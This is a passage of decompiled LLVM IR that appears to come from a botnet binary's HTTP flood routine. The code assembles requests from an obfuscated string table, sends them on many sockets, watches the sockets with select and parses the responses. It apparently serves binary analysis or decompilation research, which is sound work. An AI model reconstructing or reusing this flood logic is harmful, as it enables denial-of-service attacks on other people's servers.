  store i32 %v2_942c, i32* %r4.global-to-local, align 4
  %v3_9438 = call i8* @table_retrieve_val(i32 33, i32* null)
  %v0_9440 = load i32, i32* %r4.global-to-local, align 4
  %v1_9440 = inttoptr i32 %v0_9440 to i8*
  %v6_9448 = call i32 @util_strcpy(i8* %v1_9440, i8* %v3_9438)
  call void @table_lock_val(i8 33)
  %v3_9464 = call i32 @util_strlen(i8* %tmp161)
  %v2_947c = add i32 %v3_9464, %v2_9184
  %v1_9480 = inttoptr i32 %v2_947c to i8*
  %v6_9488 = call i32 @util_strcpy(i8* %v1_9480, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  call void @table_unlock_val(i8 34)
  %v3_94a4 = call i32 @util_strlen(i8* %tmp161)
  %v2_94b8 = add i32 %v3_94a4, %v2_9184
  store i32 %v2_94b8, i32* %r4.global-to-local, align 4
  %v3_94c4 = call i8* @table_retrieve_val(i32 34, i32* null)
  %v0_94cc = load i32, i32* %r4.global-to-local, align 4
  %v1_94cc = inttoptr i32 %v0_94cc to i8*
  %v6_94d4 = call i32 @util_strcpy(i8* %v1_94cc, i8* %v3_94c4)
  call void @table_lock_val(i8 34)
  %v3_94f0 = call i32 @util_strlen(i8* %tmp161)
  %v2_9508 = add i32 %v3_94f0, %v2_9184
  %v1_950c = inttoptr i32 %v2_9508 to i8*
  %v6_9514 = call i32 @util_strcpy(i8* %v1_950c, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  br i1 %v2_951c, label %dec_label_pc_96ac, label %dec_label_pc_9524

dec_label_pc_9524:                                ; preds = %dec_label_pc_9140
  call void @table_unlock_val(i8 35)
  %v3_953c = call i32 @util_strlen(i8* %tmp161)
  %v2_9550 = add i32 %v3_953c, %v2_9184
  store i32 %v2_9550, i32* %r4.global-to-local, align 4
  %v3_955c = call i8* @table_retrieve_val(i32 35, i32* null)
  %v0_9564 = load i32, i32* %r4.global-to-local, align 4
  %v1_9564 = inttoptr i32 %v0_9564 to i8*
  %v6_956c = call i32 @util_strcpy(i8* %v1_9564, i8* %v3_955c)
  call void @table_lock_val(i8 35)
  %v3_9588 = call i32 @util_strlen(i8* %tmp161)
  %v2_95a0 = add i32 %v3_9588, %v2_9184
  %v1_95a4 = inttoptr i32 %v2_95a0 to i8*
  %v6_95ac = call i32 @util_strcpy(i8* %v1_95a4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  %v3_95c0 = call i32 @util_strlen(i8* %tmp161)
  %v2_95d4 = add i32 %v3_95c0, %v2_9184
  store i32 %v2_95d4, i32* %r4.global-to-local, align 4
  %v3_95e0 = call i8* @table_retrieve_val(i32 40, i32* null)
  %v0_95e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_95e8 = inttoptr i32 %v0_95e8 to i8*
  %v6_95f0 = call i32 @util_strcpy(i8* %v1_95e8, i8* %v3_95e0)
  %v3_9604 = call i32 @util_strlen(i8* %tmp161)
  %v2_961c = add i32 %v3_9604, %v2_9184
  %v1_9620 = inttoptr i32 %v2_961c to i8*
  %v6_9628 = call i32 @util_strcpy(i8* %v1_9620, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22dd0.35, i32 0, i32 0))
  %v3_9630 = call i32 @util_strlen(i8* nonnull %v14_82e0)
  store i32 %v3_9630, i32* %r4.global-to-local, align 4
  %v3_9648 = call i32 @util_strlen(i8* %tmp161)
  %v2_9660 = add i32 %v3_9648, %v2_9184
  %v0_9664 = load i32, i32* %r4.global-to-local, align 4
  %v1_966c = inttoptr i32 %v2_9660 to i8*
  %v5_9670 = call i8* @util_itoa(i32 %v0_9664, i32 10, i8* %v1_966c)
  %v3_9684 = call i32 @util_strlen(i8* %tmp161)
  %v2_969c = add i32 %v3_9684, %v2_9184
  %v1_96a0 = inttoptr i32 %v2_969c to i8*
  %v6_96a8 = call i32 @util_strcpy(i8* %v1_96a0, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  br label %dec_label_pc_96ac

dec_label_pc_96ac:                                ; preds = %dec_label_pc_9140, %dec_label_pc_9524
  %v1_96b0 = add i32 %v2_8dac, 1468
  %v2_96b0 = inttoptr i32 %v1_96b0 to i32*
  %v3_96b0 = load i32, i32* %v2_96b0, align 4
  %tmp162 = icmp slt i32 %v3_96b0, 1
  br i1 %tmp162, label %dec_label_pc_97d8, label %dec_label_pc_96bc

dec_label_pc_96bc:                                ; preds = %dec_label_pc_96ac
  %v3_96cc = call i32 @util_strlen(i8* %tmp161)
  %v2_96e4 = add i32 %v3_96cc, %v2_9184
  %v1_96e8 = inttoptr i32 %v2_96e4 to i8*
  %v6_96f0 = call i32 @util_strcpy(i8* %v1_96e8, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22dfc.43, i32 0, i32 0))
  %v1_972c = add i32 %v2_8dac, 1472
  br label %dec_label_pc_978c

dec_label_pc_9700:                                ; preds = %dec_label_pc_978c
  %v2_9724 = add i32 %v3_97b0, %v2_9184
  %v3_9730 = load i32, i32* %i_-216, align 4
  %v3_9734 = mul i32 %v3_9730, 128
  %v2_9738 = add i32 %v1_972c, %v3_9734
  %v1_973c = inttoptr i32 %v2_9724 to i8*
  %v1_9740 = inttoptr i32 %v2_9738 to i8*
  %v6_9744 = call i32 @util_strcpy(i8* %v1_973c, i8* %v1_9740)
  %v3_9758 = call i32 @util_strlen(i8* %tmp161)
  %v2_9770 = add i32 %v3_9758, %v2_9184
  %v1_9774 = inttoptr i32 %v2_9770 to i8*
  %v6_977c = call i32 @util_strcpy(i8* %v1_9774, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22e08.45, i32 0, i32 0))
  %v3_9780 = load i32, i32* %i_-216, align 4
  %v1_9784 = add i32 %v3_9780, 1
  br label %dec_label_pc_978c

dec_label_pc_978c:                                ; preds = %dec_label_pc_96bc, %dec_label_pc_9700
  %storemerge32 = phi i32 [ 0, %dec_label_pc_96bc ], [ %v1_9784, %dec_label_pc_9700 ]
  store i32 %storemerge32, i32* %i_-216, align 4
  %v3_9790 = load i32, i32* %v2_96b0, align 4
  %v2_9798 = sub i32 %v3_9790, %storemerge32
  %v4_9798 = xor i32 %v3_9790, %storemerge32
  %v5_9798 = xor i32 %v2_9798, %v3_9790
  %v6_9798 = and i32 %v5_9798, %v4_9798
  %v7_9798 = icmp slt i32 %v6_9798, 0
  %v8_9798 = icmp slt i32 %v2_9798, 0
  %v9_9798 = icmp eq i32 %v3_9790, %storemerge32
  %v3_979c = xor i1 %v8_9798, %v7_9798
  %v4_979c = or i1 %v9_9798, %v3_979c
  %v3_97b0 = call i32 @util_strlen(i8* %tmp161)
  br i1 %v4_979c, label %dec_label_pc_97a0, label %dec_label_pc_9700

dec_label_pc_97a0:                                ; preds = %dec_label_pc_978c
  %v2_97c8 = add i32 %v3_97b0, %v2_9184
  %v1_97cc = inttoptr i32 %v2_97c8 to i8*
  %v6_97d4 = call i32 @util_strcpy(i8* %v1_97cc, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  br label %dec_label_pc_97d8

dec_label_pc_97d8:                                ; preds = %dec_label_pc_96ac, %dec_label_pc_97a0
  %v3_97e8 = call i32 @util_strlen(i8* %tmp161)
  %v2_9800 = add i32 %v3_97e8, %v2_9184
  %v1_9804 = inttoptr i32 %v2_9800 to i8*
  %v6_980c = call i32 @util_strcpy(i8* %v1_9804, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  br i1 %v2_951c, label %dec_label_pc_9854, label %dec_label_pc_981c

dec_label_pc_981c:                                ; preds = %dec_label_pc_97d8
  %v3_982c = call i32 @util_strlen(i8* %tmp161)
  %v2_9844 = add i32 %v3_982c, %v2_9184
  %v1_9848 = inttoptr i32 %v2_9844 to i8*
  %v6_9850 = call i32 @util_strcpy(i8* %v1_9848, i8* nonnull %v14_82e0)
  br label %dec_label_pc_9854

dec_label_pc_9854:                                ; preds = %dec_label_pc_97d8, %dec_label_pc_981c
  %v1_9864 = add i32 %v2_8dac, 1440
  %v1_986c = inttoptr i32 %v1_9864 to i8*
  %v6_9870 = call i8 @util_strcmp(i8* %v1_91cc, i8* %v1_986c)
  %v2_9878 = icmp eq i8 %v6_9870, 0
  br i1 %v2_9878, label %dec_label_pc_9880, label %dec_label_pc_98a0

dec_label_pc_9880:                                ; preds = %dec_label_pc_9854
  %v6_989c = call i32 @util_strcpy(i8* %v1_91cc, i8* %v1_986c)
  br label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_9854, %dec_label_pc_9880
  %v1_98a4 = inttoptr i32 %v2_8dac to i32*
  %v2_98a4 = load i32, i32* %v1_98a4, align 4
  store i32 %v2_98a4, i32* @r4, align 4
  %v3_98b8 = call i32 @util_strlen(i8* %tmp161)
  %v0_98d0 = load i32, i32* @r4, align 4
  %v4_98dc = call i32 @__libc_send(i32 %v0_98d0, i32 %v2_9184, i32 %v3_98b8, i32 16384)
  %v2_98e8 = add i32 %v2_8dac, 12
  %v3_98e8 = inttoptr i32 %v2_98e8 to i32*
  store i32 %v2_8ce0, i32* %v3_98e8, align 4
  store i8 6, i8* %v2_8db8, align 1
  %v2_98fc = load i32, i32* %v1_98a4, align 4
  %v3_9900 = udiv i32 %v2_98fc, 32
  %v3_9914 = mul nuw nsw i32 %v3_9900, 4
  %v2_991c = add i32 %v3_9914, %v2_8260
  %v2_9920 = add i32 %v2_991c, -10588
  %v1_9924 = inttoptr i32 %v2_9920 to i32*
  %v2_9924 = load i32, i32* %v1_9924, align 4
  %v2_992c = load i32, i32* %v1_98a4, align 4
  %v1_9930 = urem i32 %v2_992c, 32
  %v6_9938 = shl i32 1, %v1_9930
  %v2_993c = or i32 %v6_9938, %v2_9924
  store i32 %v2_8260, i32* @lr, align 4
  store i32 %v2_993c, i32* %v1_9924, align 4
  %v2_9960 = load i32, i32* %v1_98a4, align 4
  %v2_9968 = sub i32 %v2_9960, %nfds_-172.1191
  %v4_9968 = xor i32 %v2_9960, %nfds_-172.1191
  %v5_9968 = xor i32 %v2_9968, %v2_9960
  %v6_9968 = and i32 %v5_9968, %v4_9968
  %v7_9968 = icmp slt i32 %v6_9968, 0
  %v8_9968 = icmp slt i32 %v2_9968, 0
  %v9_9968 = icmp eq i32 %v2_9960, %nfds_-172.1191
  %v3_996c = xor i1 %v8_9968, %v7_9968
  %v4_996c = or i1 %v9_9968, %v3_996c
  br i1 %v4_996c, label %dec_label_pc_9bbc, label %dec_label_pc_9970

dec_label_pc_9970:                                ; preds = %dec_label_pc_98a0
  %v2_9974 = load i32, i32* %v1_98a4, align 4
  %v1_9978 = add i32 %v2_9974, 1
  br label %dec_label_pc_9bbc

dec_label_pc_9984:                                ; preds = %dec_label_pc_9130
  %v3_9988 = load i8, i8* %v2_8db8, align 1
  %v7_998c = icmp eq i8 %v3_9988, 6
  br i1 %v7_998c, label %dec_label_pc_9994, label %dec_label_pc_9a20

dec_label_pc_9994:                                ; preds = %dec_label_pc_9984
  %v1_9998 = inttoptr i32 %v2_8dac to i32*
  %v2_9998 = load i32, i32* %v1_9998, align 4
  %v3_999c = udiv i32 %v2_9998, 32
  %v3_99b0 = mul nuw nsw i32 %v3_999c, 4
  %v2_99b8 = add i32 %v3_99b0, %v2_8260
  %v2_99bc = add i32 %v2_99b8, -10588
  %v1_99c0 = inttoptr i32 %v2_99bc to i32*
  %v2_99c0 = load i32, i32* %v1_99c0, align 4
  %v2_99c8 = load i32, i32* %v1_9998, align 4
  %v1_99cc = urem i32 %v2_99c8, 32
  %v6_99d4 = shl i32 1, %v1_99cc
  %v2_99d8 = or i32 %v6_99d4, %v2_99c0
  store i32 %v2_8260, i32* @lr, align 4
  store i32 %v2_99d8, i32* %v1_99c0, align 4
  %v2_99fc = load i32, i32* %v1_9998, align 4
  %v2_9a04 = sub i32 %v2_99fc, %nfds_-172.1191
  %v4_9a04 = xor i32 %v2_99fc, %nfds_-172.1191
  %v5_9a04 = xor i32 %v2_9a04, %v2_99fc
  %v6_9a04 = and i32 %v5_9a04, %v4_9a04
  %v7_9a04 = icmp slt i32 %v6_9a04, 0
  %v8_9a04 = icmp slt i32 %v2_9a04, 0
  %v9_9a04 = icmp eq i32 %v2_99fc, %nfds_-172.1191
  %v3_9a08 = xor i1 %v8_9a04, %v7_9a04
  %v4_9a08 = or i1 %v9_9a04, %v3_9a08
  br i1 %v4_9a08, label %dec_label_pc_9bbc, label %dec_label_pc_9a0c

dec_label_pc_9a0c:                                ; preds = %dec_label_pc_9994
  %v2_9a10 = load i32, i32* %v1_9998, align 4
  %v1_9a14 = add i32 %v2_9a10, 1
  br label %dec_label_pc_9bbc

dec_label_pc_9a20:                                ; preds = %dec_label_pc_9984
  %v3_9a24 = load i8, i8* %v2_8db8, align 1
  %v7_9a28 = icmp eq i8 %v3_9a24, 7
  br i1 %v7_9a28, label %dec_label_pc_9a30, label %dec_label_pc_9abc

dec_label_pc_9a30:                                ; preds = %dec_label_pc_9a20
  %v1_9a34 = inttoptr i32 %v2_8dac to i32*
  %v2_9a34 = load i32, i32* %v1_9a34, align 4
  %v3_9a38 = udiv i32 %v2_9a34, 32
  %v3_9a4c = mul nuw nsw i32 %v3_9a38, 4
  %v2_9a54 = add i32 %v3_9a4c, %v2_8260
  %v2_9a58 = add i32 %v2_9a54, -10588
  %v1_9a5c = inttoptr i32 %v2_9a58 to i32*
  %v2_9a5c = load i32, i32* %v1_9a5c, align 4
  %v2_9a64 = load i32, i32* %v1_9a34, align 4
  %v1_9a68 = urem i32 %v2_9a64, 32
  %v6_9a70 = shl i32 1, %v1_9a68
  %v2_9a74 = or i32 %v6_9a70, %v2_9a5c
  store i32 %v2_8260, i32* @lr, align 4
  store i32 %v2_9a74, i32* %v1_9a5c, align 4
  %v2_9a98 = load i32, i32* %v1_9a34, align 4
  %v2_9aa0 = sub i32 %v2_9a98, %nfds_-172.1191
  %v4_9aa0 = xor i32 %v2_9a98, %nfds_-172.1191
  %v5_9aa0 = xor i32 %v2_9aa0, %v2_9a98
  %v6_9aa0 = and i32 %v5_9aa0, %v4_9aa0
  %v7_9aa0 = icmp slt i32 %v6_9aa0, 0
  %v8_9aa0 = icmp slt i32 %v2_9aa0, 0
  %v9_9aa0 = icmp eq i32 %v2_9a98, %nfds_-172.1191
  %v3_9aa4 = xor i1 %v8_9aa0, %v7_9aa0
  %v4_9aa4 = or i1 %v9_9aa0, %v3_9aa4
  br i1 %v4_9aa4, label %dec_label_pc_9bbc, label %dec_label_pc_9aa8

dec_label_pc_9aa8:                                ; preds = %dec_label_pc_9a30
  %v2_9aac = load i32, i32* %v1_9a34, align 4
  %v1_9ab0 = add i32 %v2_9aac, 1
  br label %dec_label_pc_9bbc

dec_label_pc_9abc:                                ; preds = %dec_label_pc_9a20
  %v3_9ac0 = load i8, i8* %v2_8db8, align 1
  %v7_9ac4 = icmp eq i8 %v3_9ac0, 10
  br i1 %v7_9ac4, label %dec_label_pc_9acc, label %dec_label_pc_9b58

dec_label_pc_9acc:                                ; preds = %dec_label_pc_9abc
  %v1_9ad0 = inttoptr i32 %v2_8dac to i32*
  %v2_9ad0 = load i32, i32* %v1_9ad0, align 4
  %v3_9ad4 = udiv i32 %v2_9ad0, 32
  %v3_9ae8 = mul nuw nsw i32 %v3_9ad4, 4
  %v2_9af0 = add i32 %v3_9ae8, %v2_8260
  %v2_9af4 = add i32 %v2_9af0, -10588
  %v1_9af8 = inttoptr i32 %v2_9af4 to i32*
  %v2_9af8 = load i32, i32* %v1_9af8, align 4
  %v2_9b00 = load i32, i32* %v1_9ad0, align 4
  %v1_9b04 = urem i32 %v2_9b00, 32
  %v6_9b0c = shl i32 1, %v1_9b04
  %v2_9b10 = or i32 %v6_9b0c, %v2_9af8
  store i32 %v2_8260, i32* @lr, align 4
  store i32 %v2_9b10, i32* %v1_9af8, align 4
  %v2_9b34 = load i32, i32* %v1_9ad0, align 4
  %v2_9b3c = sub i32 %v2_9b34, %nfds_-172.1191
  %v4_9b3c = xor i32 %v2_9b34, %nfds_-172.1191
  %v5_9b3c = xor i32 %v2_9b3c, %v2_9b34
  %v6_9b3c = and i32 %v5_9b3c, %v4_9b3c
  %v7_9b3c = icmp slt i32 %v6_9b3c, 0
  %v8_9b3c = icmp slt i32 %v2_9b3c, 0
  %v9_9b3c = icmp eq i32 %v2_9b34, %nfds_-172.1191
  %v3_9b40 = xor i1 %v8_9b3c, %v7_9b3c
  %v4_9b40 = or i1 %v9_9b3c, %v3_9b40
  br i1 %v4_9b40, label %dec_label_pc_9bbc, label %dec_label_pc_9b44

dec_label_pc_9b44:                                ; preds = %dec_label_pc_9acc
  %v2_9b48 = load i32, i32* %v1_9ad0, align 4
  %v1_9b4c = add i32 %v2_9b48, 1
  br label %dec_label_pc_9bbc

dec_label_pc_9b58:                                ; preds = %dec_label_pc_9abc
  store i8 0, i8* %v2_8db8, align 1
  %v1_9b78 = inttoptr i32 %v2_8dac to i32*
  %v2_9b78 = load i32, i32* %v1_9b78, align 4
  %v1_9b80 = call i32 @__GI___libc_close(i32 %v2_9b78)
  store i32 -1, i32* %v1_9b78, align 4
  br label %dec_label_pc_9bbc

dec_label_pc_9bbc:                                ; preds = %dec_label_pc_9b58, %dec_label_pc_9acc, %dec_label_pc_9a30, %dec_label_pc_9994, %dec_label_pc_98a0, %dec_label_pc_907c, %dec_label_pc_8e88, %dec_label_pc_8e5c, %dec_label_pc_9b44, %dec_label_pc_9aa8, %dec_label_pc_9a0c, %dec_label_pc_9970, %dec_label_pc_90f4, %dec_label_pc_9050, %dec_label_pc_9010
  %nfds_-172.0 = phi i32 [ %nfds_-172.1191, %dec_label_pc_8e5c ], [ %nfds_-172.1191, %dec_label_pc_8e88 ], [ %v1_9018, %dec_label_pc_9010 ], [ %nfds_-172.1191, %dec_label_pc_907c ], [ %v1_90fc, %dec_label_pc_90f4 ], [ %nfds_-172.1191, %dec_label_pc_9050 ], [ %nfds_-172.1191, %dec_label_pc_98a0 ], [ %v1_9978, %dec_label_pc_9970 ], [ %nfds_-172.1191, %dec_label_pc_9994 ], [ %v1_9a14, %dec_label_pc_9a0c ], [ %nfds_-172.1191, %dec_label_pc_9a30 ], [ %v1_9ab0, %dec_label_pc_9aa8 ], [ %nfds_-172.1191, %dec_label_pc_9acc ], [ %v1_9b4c, %dec_label_pc_9b44 ], [ %nfds_-172.1191, %dec_label_pc_9b58 ]
  %v1_9bc0 = add nuw nsw i32 %storemerge24192, 1
  %v5_9bd4 = icmp slt i32 %v1_9bc0, %sockets_-180.0
  br i1 %v5_9bd4, label %dec_label_pc_8d80, label %dec_label_pc_9bd8

dec_label_pc_9bd8:                                ; preds = %dec_label_pc_9bbc, %dec_label_pc_9bc8.preheader
  %nfds_-172.1.lcssa = phi i32 [ 0, %dec_label_pc_9bc8.preheader ], [ %nfds_-172.0, %dec_label_pc_9bbc ]
  %v2_9bdc = icmp eq i32 %nfds_-172.1.lcssa, 0
  br i1 %v2_9bdc, label %dec_label_pc_8d08.lr.ph, label %dec_label_pc_9be4

dec_label_pc_9be4:                                ; preds = %dec_label_pc_9bd8
  store i32 1, i32* %v5_9c14, align 8
  %v5_9c50 = call i32 @__libc_select(i32 %nfds_-172.1.lcssa, i32 %v2_8cf4, i32 %v2_8d38, i32 0, i32 %v3_9bf4)
  %v2_9c60 = call i32 @__GI_time(i32* null)
  %tmp163 = icmp slt i32 %v5_9c50, 1
  br i1 %tmp163, label %dec_label_pc_8d08.lr.ph, label %dec_label_pc_ba64.preheader

dec_label_pc_ba64.preheader:                      ; preds = %dec_label_pc_9be4
  br i1 %v5_8cd0209, label %dec_label_pc_9c84, label %dec_label_pc_8d08.lr.ph

dec_label_pc_9c84:                                ; preds = %dec_label_pc_ba64.preheader, %dec_label_pc_ba58
  %storemerge25202 = phi i32 [ %v1_ba5c, %dec_label_pc_ba58 ], [ 0, %dec_label_pc_ba64.preheader ]
  %v3_9ca4 = mul i32 %storemerge25202, 3140
  %v2_9cb0 = add i32 %v3_9ca4, %v2_8598
  %v1_9cbc = inttoptr i32 %v2_9cb0 to i32*
  %v2_9cbc = load i32, i32* %v1_9cbc, align 4
  %v7_9cc0 = icmp eq i32 %v2_9cbc, -1
  br i1 %v7_9cc0, label %dec_label_pc_ba58, label %dec_label_pc_9cc8

dec_label_pc_9cc8:                                ; preds = %dec_label_pc_9c84
  %v2_9ccc = load i32, i32* %v1_9cbc, align 4
  %v3_9cd0 = udiv i32 %v2_9ccc, 32
  %v3_9cdc = mul nuw nsw i32 %v3_9cd0, 4
  store i32 %v2_8260, i32* @lr, align 4
  %v2_9ce4 = add i32 %v3_9cdc, %v2_8260
  %v2_9ce8 = add i32 %v2_9ce4, -10716
  %v1_9cec = inttoptr i32 %v2_9ce8 to i32*
  %v2_9cec = load i32, i32* %v1_9cec, align 4
  %v2_9cf4 = load i32, i32* %v1_9cbc, align 4
  %v1_9cf8 = urem i32 %v2_9cf4, 32
  %v6_9cfc2 = lshr i32 %v2_9cec, %v1_9cf8
  %v1_9d04 = urem i32 %v6_9cfc2, 2
  %v2_9d08 = icmp eq i32 %v1_9d04, 0
  br i1 %v2_9d08, label %dec_label_pc_9dd8, label %dec_label_pc_9d10

dec_label_pc_9d10:                                ; preds = %dec_label_pc_9cc8
  store i32 0, i32* %err_-10488, align 4
  store i32 4, i32* %err_len_-10492, align 4
  %v2_9d3c = load i32, i32* %v1_9cbc, align 4
  store i32 %v2_9d48, i32* @ip, align 4
  store i32 1, i32* @r1, align 4
  %v5_9d6c = call i32 @getsockopt(i32 %v2_9d3c, i32 1, i32 4, i32 %v2_9d48, i32 %v2_9d54)
  %v4_9d84 = load i32, i32* %err_-10488, align 4
  %v2_9d88 = icmp eq i32 %v4_9d84, 0
  br i1 %v2_9d88, label %dec_label_pc_9d90, label %dec_label_pc_9dac

dec_label_pc_9d90:                                ; preds = %dec_label_pc_9d10
  %v2_9d94 = icmp eq i32 %v5_9d6c, 0
  br i1 %v2_9d94, label %dec_label_pc_9d9c, label %dec_label_pc_9dac

dec_label_pc_9d9c:                                ; preds = %dec_label_pc_9d90
  %v3_9da4 = add i32 %v2_9cb0, 4
  %v4_9da4 = inttoptr i32 %v3_9da4 to i8*
  store i8 4, i8* %v4_9da4, align 1
  br label %dec_label_pc_9dd8

dec_label_pc_9dac:                                ; preds = %dec_label_pc_9d90, %dec_label_pc_9d10
  %v2_9db0 = load i32, i32* %v1_9cbc, align 4
  %v1_9db8 = call i32 @__GI___libc_close(i32 %v2_9db0)
  store i32 -1, i32* %v1_9cbc, align 4
  %v3_9dd0 = add i32 %v2_9cb0, 4
  %v4_9dd0 = inttoptr i32 %v3_9dd0 to i8*
  store i8 0, i8* %v4_9dd0, align 1
  br label %dec_label_pc_ba58

dec_label_pc_9dd8:                                ; preds = %dec_label_pc_9cc8, %dec_label_pc_9d9c
  %v2_9ddc = load i32, i32* %v1_9cbc, align 4
  %v3_9de0 = udiv i32 %v2_9ddc, 32
  %v3_9dec = mul nuw nsw i32 %v3_9de0, 4
  store i32 %v2_8260, i32* @lr, align 4
  %v2_9df4 = add i32 %v3_9dec, %v2_8260
  %v2_9df8 = add i32 %v2_9df4, -10588
  %v1_9dfc = inttoptr i32 %v2_9df8 to i32*
  %v2_9dfc = load i32, i32* %v1_9dfc, align 4
  %v2_9e04 = load i32, i32* %v1_9cbc, align 4
  %v1_9e08 = urem i32 %v2_9e04, 32
  %v6_9e0c3 = lshr i32 %v2_9dfc, %v1_9e08
  %v1_9e14 = urem i32 %v6_9e0c3, 2
  %v2_9e18 = icmp eq i32 %v1_9e14, 0
  br i1 %v2_9e18, label %dec_label_pc_ba58, label %dec_label_pc_9e20

dec_label_pc_9e20:                                ; preds = %dec_label_pc_9dd8
  %v1_9e24 = add i32 %v2_9cb0, 4
  %v2_9e24 = inttoptr i32 %v1_9e24 to i8*
  %v3_9e24 = load i8, i8* %v2_9e24, align 1
  %v7_9e28 = icmp eq i8 %v3_9e24, 6
  br i1 %v7_9e28, label %dec_label_pc_9e30, label %dec_label_pc_b2ac

dec_label_pc_9e30:                                ; preds = %dec_label_pc_9e20
  call void @util_zero(i8* %v3_8428, i32 10240)
  %v2_9e54 = load i32, i32* %v1_9cbc, align 4
  %v4_9e78 = call i32 @__libc_recv(i32 %v2_9e54, i32 %v3_8410, i32 10240, i32 16386)
  %v5_9e8c = icmp sgt i32 %v4_9e78, 0
  br i1 %v5_9e8c, label %dec_label_pc_9ebc, label %dec_label_pc_9e90

dec_label_pc_9e90:                                ; preds = %dec_label_pc_9e30
  %v2_9e94 = load i32, i32* %v1_9cbc, align 4
  %v1_9e9c = call i32 @__GI___libc_close(i32 %v2_9e94)
  store i32 -1, i32* %v1_9cbc, align 4
  store i8 0, i8* %v2_9e24, align 1
  br label %dec_label_pc_ba58

dec_label_pc_9ebc:                                ; preds = %dec_label_pc_9e30
  %v9_9ed8 = call i32 @util_memsearch(i8* %v3_8428, i32 %v4_9e78, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22e0c.47, i32 0, i32 0), i32 4)
  %v3_9ee0 = icmp eq i32 %v9_9ed8, -1
  br i1 %v3_9ee0, label %dec_label_pc_9ee8, label %dec_label_pc_9efc

dec_label_pc_9ee8:                                ; preds = %dec_label_pc_9ebc
  %v7_9ef8 = icmp slt i32 %v4_9e78, 10240
  br i1 %v7_9ef8, label %dec_label_pc_ba58, label %dec_label_pc_9efc

dec_label_pc_9efc:                                ; preds = %dec_label_pc_9ebc, %dec_label_pc_9ee8
  %v8_9f18 = call i32 @util_memsearch(i8* %v3_8428, i32 %v4_9e78, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22e0c.47, i32 0, i32 0), i32 4)
  %v2_9f30 = add i32 %v8_9f18, %v3_8410
  %v3_9f38 = inttoptr i32 %v2_9f30 to i8*
  store i8 0, i8* %v3_9f38, align 1
  %v3_9f44 = call i8* @table_retrieve_val(i32 46, i32* null)
  %v7_9f60 = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_9f44)
  %v7_9f68 = icmp eq i32 %v7_9f60, -1
  br i1 %v7_9f68, label %dec_label_pc_9f7c, label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %dec_label_pc_9efc
  %v2_9f78 = add i32 %v2_9cb0, 1452
  %v3_9f78 = inttoptr i32 %v2_9f78 to i32*
  store i32 2, i32* %v3_9f78, align 4
  br label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9efc, %dec_label_pc_9f70
  %v3_9f84 = call i8* @table_retrieve_val(i32 45, i32* null)
  %v7_9fa4 = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_9f84)
  %v7_9fac = icmp eq i32 %v7_9fa4, -1
  br i1 %v7_9fac, label %dec_label_pc_9fc0, label %dec_label_pc_9fb4

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9f7c
  %v2_9fbc = add i32 %v2_9cb0, 1452
  %v3_9fbc = inttoptr i32 %v2_9fbc to i32*
  store i32 1, i32* %v3_9fbc, align 4
  br label %dec_label_pc_9fc0

dec_label_pc_9fc0:                                ; preds = %dec_label_pc_9f7c, %dec_label_pc_9fb4
  %v2_9fc8 = add i32 %v2_9cb0, 1456
  %v3_9fc8 = inttoptr i32 %v2_9fc8 to i32*
  store i32 0, i32* %v3_9fc8, align 4
  %v3_9fd4 = call i8* @table_retrieve_val(i32 44, i32* null)
  %v7_9ff0 = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_9fd4)
  %v7_9ff8 = icmp eq i32 %v7_9ff0, -1
  br i1 %v7_9ff8, label %dec_label_pc_a14c, label %dec_label_pc_a000

dec_label_pc_a000:                                ; preds = %dec_label_pc_9fc0
  %v3_a008 = call i8* @table_retrieve_val(i32 44, i32* null)
  %v7_a024 = call i32 @util_stristr(i8* %v3_8428, i32 %v4_9e78, i8* %v3_a008)
  %v2_a044 = add i32 %v7_a024, %v3_8410
  %v1_a048 = inttoptr i32 %v2_a044 to i8*
  %v2_a048 = load i8, i8* %v1_a048, align 1
  %v7_a04c = icmp eq i8 %v2_a048, 32
  br i1 %v7_a04c, label %dec_label_pc_a054, label %dec_label_pc_a060

dec_label_pc_a054:                                ; preds = %dec_label_pc_a000
  %v1_a058 = add i32 %v7_a024, 1
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_a000, %dec_label_pc_a054
  %stack_var_-136.0 = phi i32 [ %v1_a058, %dec_label_pc_a054 ], [ %v7_a024, %dec_label_pc_a000 ]
  %v2_a074 = add i32 %stack_var_-136.0, %v3_8410
  %v2_a080 = sub i32 %v4_9e78, %stack_var_-136.0
  %v1_a084 = inttoptr i32 %v2_a074 to i8*
  %v8_a094 = call i32 @util_memsearch(i8* %v1_a084, i32 %v2_a080, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0), i32 2)
  %v7_a0a4 = icmp eq i32 %v8_a094, -1
  br i1 %v7_a0a4, label %dec_label_pc_a14c, label %dec_label_pc_a0ac

dec_label_pc_a0ac:                                ; preds = %dec_label_pc_a060
  %v7_a0d0 = icmp slt i32 %v8_a094, 2
  br i1 %v7_a0d0, label %dec_label_pc_a0e0, label %dec_label_pc_a0d4

dec_label_pc_a0d4:                                ; preds = %dec_label_pc_a0ac
  %v1_a0d8 = add i32 %v8_a094, -2
  br label %dec_label_pc_a0e0

dec_label_pc_a0e0:                                ; preds = %dec_label_pc_a0ac, %dec_label_pc_a0d4
